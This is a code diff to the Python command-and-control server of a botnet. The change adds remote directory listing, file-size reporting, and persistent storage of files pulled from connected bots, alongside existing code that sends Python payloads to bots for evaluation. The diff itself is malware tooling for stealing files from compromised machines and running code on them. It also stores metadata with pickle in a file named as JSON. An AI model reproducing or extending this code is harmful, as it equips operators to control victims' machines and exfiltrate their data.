@@ -1,10 +1,12 @@
 import importlib
 from distutils.version import LooseVersion
 import json
+import pickle
 from threading import Thread, Condition
 from threading import Lock
 import select
 import base64
+import uuid
 import os
 
 try:
@@ -26,17 +28,20 @@ class BotNet(Thread):
     SPEC_JSON = 'special'
     FILESTREAM_JSON = 'filestreams'
     FILECLOSE_JSON = 'fileclose'
+    LS_JSON = 'ls'
+    FILESIZE_JSON = 'filesize'
     PAYLOAD_EXT = '.py'
 
-    def __init__(self, socketio, payloadpath="payloads"):
+    def __init__(self, socketio, payloadpath="payloads", downloadpath="media/downloads"):
         super().__init__()
         self.connlock = Lock()
         self.conncon = Condition(self.connlock)
         self.allConnections = {}
         self.socketio = socketio
-        self.filemanager = BotNetFileManager()
+        self.filemanager = BotNetFileManager(downloadpath)
         self.payloadpath = payloadpath
         self.payloadfiles = []
+        self.downloaddir = downloadpath
 
     def addConnection(self, user, conn):
         with self.connlock:
@@ -113,10 +118,15 @@ class BotNet(Thread):
                                         'stderr': err},
                                        namespace="/bot")
 
-                    self.socketio.emit('finder',
-                                       {'special': special,
-                                        'user': user},
-                                       namespace="/bot")
+                    if len(special) > 0:
+                        if BotNet.LS_JSON in special:
+                            self.socketio.emit('finder',
+                                               {'special': special,
+                                                'user': user},
+                                               namespace="/bot")
+                        if BotNet.FILESIZE_JSON in special:
+                            fileinfo = json.loads(special[BotNet.FILESIZE_JSON])
+                            self.filemanager.setFileSize(user,fileinfo['filename'],fileinfo['filesize'])
 
                     # Forward file bytes as needed
                     for filename in filestream.keys():
@@ -184,13 +194,11 @@ class BotNet(Thread):
             payloadtext = f.read()
             return self.sendEval(user,payloadtext)
 
-
     def startFileDownload(self, user, filename):
         with self.connlock:
             if user in self.allConnections:
-                self.filemanager.clearFile(user, filename)
                 self.allConnections[user].startFileDownload(filename)
-                return self.filemanager.getFileGenerator(user, filename)
+                return True
             return None
 
     def requestLs(self, user, filename):
@@ -201,6 +209,8 @@ class BotNet(Thread):
     def getFileManager(self):
         return self.filemanager
 
+    def getDownloadFiles(self):
+        return self.filemanager.getFilesAndInfo()
 
 class BotServer(Thread):
     def __init__(self, tcpsock, botnet, socketio):
@@ -282,7 +292,7 @@ class Bot:
             if len(dat) > 0:
                 while len(dat) > 0:
                     # Turn the bytes into b64 encoded bytes, then into string
-                    bytestr = base64.b64encode(dat).encode('UTF-8')
+                    bytestr = base64.b64encode(dat).decode('UTF-8')
                     if filename:
                         # Particular file
                         json_str = json.dumps({Bot.FILE_STREAM: bytestr, Bot.FILE_FILENAME: filename})
@@ -312,53 +322,66 @@ class Bot:
 
 
 class BotNetFileManager:
+    FILENAME_OBJFILE = 'filenames.json'
+
     # TODO: change to separate locks for each file
-    def __init__(self):
-        self.files = {}
-        self.closed = set()
+    def __init__(self,outputdir):
+        '''
+        Contains internal json object, doesn't need to update file for current bytes,
+        only for names, close, and maxbytes
+        :param outputdir: directory for storing downloads
+        '''
+        self.fileobjs = {}
+        self.filedets = {}
         self.lock = Lock()
-        self.cond = Condition(self.lock)
-
-    def getFileGenerator(self, user, filename):
-        uf = (user, filename)
-
-        def filegen():
-            with self.lock:
-                # While there's something left and it's not closed
-                # Therefore: exits loop if closed and empty buffer
-                while uf not in self.closed or len(self.files[uf]) > 0:
-                    # Wait until closed or something to write
-                    # Therefore: exits wait if closed or nonempty buffer
-                    while (uf not in self.files or len(self.files[uf]) == 0) and uf not in self.closed:
-                        self.cond.wait()
-                    if len(self.files[uf]) > 0:
-                        temp = self.files[uf]
-                        self.files[uf] = b''
-                        yield base64.b64encode(temp)
-                self.closed.remove(uf)
-
-        return filegen()
+        self.outputdir = outputdir
+        self.filenamefile = os.path.join(outputdir,BotNetFileManager.FILENAME_OBJFILE)
+        if os.path.exists(self.filenamefile):
+            with open(self.filenamefile,"rb") as jsonfile:
+                self.filedets = pickle.load(jsonfile)
 
     def appendBytesToFile(self, user, filename, wbytes):
         uf = (user, filename)
         with self.lock:
-            if uf not in self.files:
-                self.files[uf] = b''
-
-            self.files[uf] += wbytes
-            self.cond.notify()
-
-    def clearFile(self, user, filename):
-        uf = (user, filename)
-        with self.lock:
-            if uf in self.files:
-                self.files[uf] = b''
-            if uf in self.closed:
-                self.closed.remove(uf)
+            if uf not in self.fileobjs:
+                filename = str(uuid.uuid4())
+                self.fileobjs[uf] = open(os.path.join(self.outputdir, filename), "wb")
+                self.filedets[uf] = [filename,0,0]
+                with open(self.filenamefile,"wb") as jsonfile:
+                    pickle.dump(self.filedets, jsonfile)
+            self.fileobjs[uf].write(wbytes)
+            self.filedets[uf][1] += len(wbytes)
 
     def closeFile(self, user, filename):
         uf = (user, filename)
         with self.lock:
-            if uf not in self.closed:
-                self.closed.add(uf)
-                self.cond.notify()
+            self.fileobjs[uf].close()
+            with open(self.filenamefile, "wb") as jsonfile:
+                pickle.dump(self.filedets, jsonfile)
+
+    def setFileSize(self, user, filename, filesize):
+        uf = (user, filename)
+        with self.lock:
+            if uf not in self.fileobjs:
+                filename = str(uuid.uuid4())
+                self.fileobjs[uf] = open(os.path.join(self.outputdir, filename), "wb")
+                self.filedets[uf] = [filename, 0, filesize]
+            else:
+                self.filedets[uf][2] = filesize
+            with open(self.filenamefile, "wb") as jsonfile:
+                pickle.dump(self.filedets, jsonfile)
+
+    def getFilesAndInfo(self):
+        '''
+        Creates a list of fileinfo objects with {user, filename, size, downloaded}
+        :return:
+        '''
+        # Get (user,file) list
+        ufilenames = self.filedets.keys()
+
+        fileinfo = []
+        for key in ufilenames:
+            (user, filename) = key
+            uuidname, downloaded, size = self.filedets[key]
+            fileinfo.append(dict(user=user,filename=filename,size=size,downloaded=downloaded))
+        return fileinfo
